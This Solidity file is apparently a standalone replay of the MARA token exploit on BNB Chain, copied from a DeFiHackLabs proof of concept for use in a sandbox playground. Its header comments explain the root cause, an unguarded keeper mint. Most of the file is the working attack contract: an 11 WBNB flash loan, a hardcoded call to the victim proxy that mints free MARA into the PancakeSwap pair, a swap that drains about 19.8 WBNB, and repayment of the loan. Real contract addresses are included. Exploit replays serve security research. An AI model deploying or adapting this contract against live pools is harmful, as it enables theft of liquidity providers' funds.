// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-09-MARA).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), and profit (WBNB) stays in the test
// contract (`wbnb.balanceOf(address(this))` is logged at the end). There is no
// standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack (testExploit body + DPPFlashLoanCall callback + a
// payable fallback + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants
// are copied verbatim from test/MARA_exp.sol.
//
// Root cause: MaraToken.releaseTokenFromEventOfProject(amount, to, mode) is an
// unconstrained mint (any amount, any recipient, no payment, no cap) gated
// only by `require(_onlyKeeper[msg.sender])`. The project's "buy" proxy
// (0xc6A8…, delegatecalling impl 0xA3f6…) is a registered keeper, and its
// entry point (selector 0x5fc985ea) is PUBLIC/payable and lets the caller
// supply the recipient/mode/amount arrays verbatim. The attacker calls it
// with the MARA/WBNB pair itself as the mint recipient, minting 5,280 MARA
// (2 x 2,640) directly into the pair's balance for free (plus 26,400 MARA to
// itself), then calls pair.swap() to pull out 19.8 WBNB against the donated
// MARA input leg — because Pancake's swap() only checks balance x balance >= k,
// and the freshly-donated MARA already satisfies the input side. An 11 WBNB
// DODO flash loan supplies the (fully repaid) native BNB needed to call the
// proxy's payable entry point; net profit is the pair's real WBNB liquidity
// the attacker extracted, ~8.8 WBNB.

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract MARADrain {
    IDVM constant dvm = IDVM(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair constant pancake = IPancakePair(0x6E82575Ffa729471b9B412d689EC692225b1fFcB);
    address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant victim = 0xc6A8C02dd5A3DD1616eC072BFC7c9d3DF9682A63; // "buy" proxy (keeper, unverified)

    // entrypoint — verbatim from ContractTest.testExploit()
    function run() external {
        bytes memory data =
            hex"0000000000000000000000006098a5638d8d7e9ed2f952d35b2b67c34ec6b476000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000098a7d9b8314c0000";
        uint256 amount = 11 ether;
        dvm.flashLoan(amount, 0, address(this), data);
    }

    // DODO flash-loan callback — verbatim from ContractTest.DPPFlashLoanCall()
    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        wbnb.withdraw(baseAmount);
        wbnb.approve(router, 10_000_000_000_000_000_000_000_000_000);

        // Calldata for the proxy's permissionless mint entry (selector 0x5fc985ea):
        // recipients = [pair, pair], modes = [2, 2], amounts(multipliers) = [10, 10].
        // Inside, the proxy delegatecalls impl 0xA3f6… which — being a MARA keeper —
        // calls releaseTokenFromEventOfProject 3x: 2,640 MARA to the pair (x2, from
        // the two-element array) and 26,400 MARA to this contract (msg.sender), all
        // for free.
        bytes memory encoded =
            hex"5fc985ea000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000020000000000000000000000006e82575ffa729471b9b412d689ec692225b1ffcb0000000000000000000000006e82575ffa729471b9b412d689ec692225b1ffcb0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        (bool success,) = victim.call{value: 11 ether}(encoded);
        require(success, "Call failed");

        // The pair now holds 5,280 un-paid-for MARA above its recorded reserve0.
        // Swap it out for WBNB — sized just under the AMM max so the k-check passes.
        uint256 amountOut = 19_800_000_000_000_000_000;
        pancake.swap(0, amountOut, address(this), "");

        // Repay the flash loan; the remainder (~8.8 WBNB) is pure profit.
        wbnb.transfer(address(dvm), baseAmount);
    }

    // receives native BNB from wbnb.withdraw()
    receive() external payable {}
}
